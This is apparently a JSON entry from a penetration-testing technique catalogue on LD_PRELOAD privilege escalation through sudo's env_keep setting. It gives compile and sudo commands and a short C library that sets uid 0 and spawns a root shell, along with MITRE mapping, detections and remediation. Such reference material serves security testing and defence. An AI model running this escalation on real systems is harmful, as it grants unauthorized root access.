[
  {
    "id": "linux-ld-preload",
    "tool": "manual",
    "category": "privilege_escalation",
    "phase": 6,
    "os": [
      "linux"
    ],
    "command": "# If sudo allows env_keep+=LD_PRELOAD:\ngcc -shared -fPIC -o /tmp/pe.so pe.c && sudo LD_PRELOAD=/tmp/pe.so <allowed_command>",
    "name": "LD_PRELOAD Privilege Escalation",
    "description": "If sudo preserves LD_PRELOAD, inject a shared library that spawns root shell.",
    "arguments": {
      "LD_PRELOAD": "Preload shared library before execution"
    },
    "expected_output": "# pe.c:\nvoid _init() { setuid(0); system(\"/bin/bash\"); }\n# Result: root shell",
    "use_case": "Exploit sudo env_keep with LD_PRELOAD to escalate to root.",
    "prerequisites": [
      "sudo -l shows env_keep+=LD_PRELOAD",
      "Allowed sudo command"
    ],
    "mitre_mapping": [
      "T1574.006"
    ],
    "mitre_tactic": "Privilege Escalation",
    "detections": [
      "Unusual LD_PRELOAD usage",
      "Shared library loading"
    ],
    "remediation": [
      "Remove LD_PRELOAD from env_keep",
      "Use env_reset in sudoers"
    ],
    "common_mistakes": [
      "env_keep doesn't include LD_PRELOAD"
    ],
    "alternatives": [
      "linpeas (checks automatically)"
    ],
    "references": [
      "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation"
    ],
    "tags": [
      "ld-preload",
      "sudo",
      "shared-library",
      "environment"
    ]
